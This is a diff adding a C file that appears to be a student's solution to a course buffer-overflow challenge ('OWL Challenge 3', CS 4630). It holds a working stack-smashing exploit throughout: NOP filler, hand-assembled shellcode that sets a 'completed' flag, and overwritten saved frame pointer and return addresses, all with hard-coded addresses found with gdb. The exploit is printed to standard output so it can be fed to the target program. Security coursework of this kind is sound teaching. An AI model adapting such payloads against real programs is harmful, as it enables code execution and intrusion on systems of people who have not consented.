@@ -1,0 +1,71 @@
+// Jennifer Long
+// rz5sc
+// CS 4630
+// OWL Challenge 3
+// attack_spell3.c
+
+#include <stdio.h>
+#include <string.h>
+
+///////////////////////////////////////////
+
+// General Idea:
+//    1) set ret addr to a new func where you set completed=1
+//    2) after setting completed, return to main
+
+// make completed not 0:
+    // mov "1" (0x01) to completed addr (c6 05 [compaddr] 01)
+    // push original main ret addr to ebp (68 [retaddr])
+    // ret (c3)
+
+// Values:
+    // addr of "completed": 0x0804a044
+    // name param addr: 0x0804a080
+    // ret addr: 0x080485dd
+    // saved ebp: 0xffffd0f0
+    // new "completed" ret addr: ffffd09b(depends on filler)
+
+// gdb breakpoints: readString, end of RS(*0x8048571)
+
+unsigned char attackString[] = {
+    'J', 'e', 'n', 'n',
+    'i', 'f', 'e', 'r',
+    ' ', 'L', 'o', 'n',
+    'g', 0x00, 0x90, 0x90,
+
+    /* Filler */
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90,
+
+    /* Make grade A */
+    0xc6, 0x05, 0x44, 0xa0, 0x04, 0x08, 0x01,
+    0x68, 0xdd, 0x85, 0x04, 0x08,
+    0xc3,
+
+    /* Filler (there's an 0xffffffff overwrite at 0xffffd0ac)*/
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+    0x90, 0x90, 0x90, 0x90,
+
+    /* Saved Params (ebp, grade A retaddr, param1) */
+    0xf0, 0xd0, 0xff, 0xff,
+    0x9b, 0xd0, 0xff, 0xff,
+    0x80, 0xa0, 0x04, 0x08,
+};
+
+int main() {
+ int i;
+ char *p = attackString;
+ for (i = 0; i < sizeof(attackString); i++) {
+   putchar(*p);
+   p++;
+ }
+ return 1;
+}
